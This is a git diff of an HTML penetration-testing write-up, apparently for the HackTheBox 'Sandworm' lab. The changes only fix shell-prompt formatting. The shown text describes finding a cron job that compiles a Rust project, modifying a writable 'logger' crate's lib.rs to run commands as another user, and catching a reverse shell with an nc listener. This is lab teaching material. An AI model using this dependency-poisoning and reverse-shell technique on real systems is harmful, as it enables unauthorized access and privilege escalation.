-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
 </pre></div>
 
 It appears to be a Git repository, and based on the listed files, it seems to be a Rust project.<br/><br/>
 Upon listing the contents of the <code>/opt</code> directory, another project is discovered:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span>
 <span class="n">total</span> <span class="mi">8</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">atlas</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">crates</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">atlas</span> <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="n">tipnet</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
 </pre></div>
 
 Another project named <code>logger</code> is present:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
 <span class="n">total</span> <span class="mi">12</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">atlas</span>          <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span>  <span class="n">root</span>           <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">atlas</span> <span class="n">silentobserver</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">logger</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="err">$</span>
 </pre></div>
 
 It is also a Rust project, but in this case, we have write privileges:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
 <span class="n">total</span> <span class="mi">40</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">atlas</span>           <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">..</span>
@@ -712,7 +712,7 @@ It is also a Rust project, but in this case, we have write privileges:<br/><br/>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">silentobserver</span>    <span class="mi">20</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span><span class="n">gitignore</span>
 <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">src</span>
 <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">target</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="err">$</span>
 </pre></div>
 
 Now, I will look for tasks being executed by other users. To achieve this, I will utilize <a href="https://github.com/DominicBreuker/pspy">pspy</a>. I downloaded the <code>pspy64</code> release version and uploaded it to the victim machine.<br/><br/>
@@ -720,22 +720,22 @@ After waiting patiently, a cron job was executed:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/27.png"/>
 The user "atlas" is compiling the Rust project <code>tipnet</code> using Cargo. Let's explore how we can exploit this to gain access as "atlas."<br/><br/>
 Upon inspecting the source code of <code>tipnet</code>, it was discovered that <code>logger</code> is being executed:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cat</span> <span class="n">main</span><span class="o">.</span><span class="n">rs</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">logger</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cat</span> <span class="n">main</span><span class="o">.</span><span class="n">rs</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">logger</span>
 <span class="n">extern</span> <span class="n">crate</span> <span class="n">logger</span><span class="p">;</span>
         <span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">keywords</span><span class="o">.</span><span class="n">as_str</span><span class="p">()</span><span class="o">.</span><span class="n">trim</span><span class="p">(),</span> <span class="s2">"Attempted to query TipNet without justification."</span><span class="p">);</span>
     <span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">keywords</span><span class="o">.</span><span class="n">as_str</span><span class="p">()</span><span class="o">.</span><span class="n">trim</span><span class="p">(),</span> <span class="n">justification</span><span class="o">.</span><span class="n">as_str</span><span class="p">());</span>
     <span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="s2">"ROUTINE"</span><span class="p">,</span> <span class="s2">" - "</span><span class="p">,</span> <span class="s2">"Pulling fresh submissions into database."</span><span class="p">);</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
 </pre></div>
 
 Specifically, the <code>log</code> function from <code>logger</code> is being called. Let's delve into the source code of <code>logger</code>.<br/><br/>
 Upon listing the contents of <code>/src</code> for <code>logger</code>, a Rust file named <code>lib.rs</code> is found:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
 <span class="n">total</span> <span class="mi">12</span>
 <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">atlas</span> <span class="n">silentobserver</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">atlas</span> <span class="n">silentobserver</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">..</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">732</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
 </pre></div>
 
 Here, we observe the source code of the <code>log</code> function being invoked in <code>tipnet</code>:<br/><br/>
@@ -777,13 +777,13 @@ We can add the following content to execute commands:<br/><br/>
 </pre></div>
 
 Let's add it to the <code>log</code> function. Initially, I will copy <code>lib.rs</code> to the <code>/dev/shm/</code> directory, as I observed that the <code>logger</code> project is being deleted every two minutes after "atlas" runs its cron job.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">lib</span><span class="o">.</span><span class="n">rs</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">lib</span><span class="o">.</span><span class="n">rs</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 Now, let's modify the log function:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> 
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> 
 <span class="n">extern</span> <span class="n">crate</span> <span class="n">chrono</span><span class="p">;</span>
 
 <span class="n">use</span> <span class="n">std</span><span class="p">::</span><span class="n">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
@@ -822,12 +822,12 @@ Now, let's modify the log function:<br/><br/>
 </pre></div>
 
 Finally, let's copy the modified <code>lib.rs</code> file to the <code>/opt/crates/logger/src</code> directory:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 If everything works as expected, the <code>pwnedbyelswix</code> file should be created in the <code>/tmp</code> directory.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span>
 <span class="n">total</span> <span class="mi">24</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">atlas</span>    <span class="mi">0</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">15</span><span class="p">:</span><span class="mi">54</span> <span class="n">pwned</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">atlas</span>    <span class="mi">0</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">22</span><span class="p">:</span><span class="mi">26</span> <span class="n">pwnedbyelswix</span>
@@ -837,11 +837,11 @@ If everything works as expected, the <code>pwnedbyelswix</code> file should be c
 <span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">8</span><span class="n">aae57c9bffa46e59597f674e82e7e36</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">timesyncd</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">MSQqqG</span>
 <span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">17</span><span class="p">:</span><span class="mi">39</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">8</span><span class="n">aae57c9bffa46e59597f674e82e7e36</span><span class="o">-</span><span class="n">upower</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">O1cXj7</span>
 <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">07</span> <span class="n">vmware</span><span class="o">-</span><span class="n">root_809</span><span class="o">-</span><span class="mi">4282301975</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 Great, we're now executing commands as the <code>atlas</code> user. Let's proceed to gain access as the user "atlas."<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> 
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> 
 <span class="n">extern</span> <span class="n">crate</span> <span class="n">chrono</span><span class="p">;</span>
 
 <span class="n">use</span> <span class="n">std</span><span class="p">::</span><span class="n">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
@@ -877,36 +877,36 @@ Great, we're now executing commands as the <code>atlas</code> user. Let's procee
         <span class="n">println</span><span class="err">!</span><span class="p">(</span><span class="s2">"Error writing to log file: </span><span class="si">{}</span><span class="s2">"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 Before copying the new <code>lib.rs</code> file to <code>/opt/crates/logger/src/</code>, let's set up our netcat (nc) listener to capture the reverse shell:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
 </pre></div>
 
 Now, let's copy the new <code>lib.rs</code> file to <code>/opt/crates/logger/src/</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span>
 </pre></div>
 
 After a few minutes of waiting, we have successfully obtained a reverse shell as the user <code>atlas</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.218</span><span class="p">:</span><span class="mf">37366.</span>
 <span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">22106</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
 <span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
 </pre></div>
 
 Now, let's simply adjust the TTY to interact more comfortably with the system:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
 <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
 <span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
 <span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 
 <span class="n">elswix</span><span class="nd">@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
@@ -915,25 +915,25 @@ Now, let's simply adjust the TTY to interact more comfortably with the system:<b
 <span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
 <span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
 </pre></div>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
 </pre></div>
 <h3><br>Shell as root</br></h3><br>
 Upon listing the groups, we notice an interesting group:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="nb">id</span>
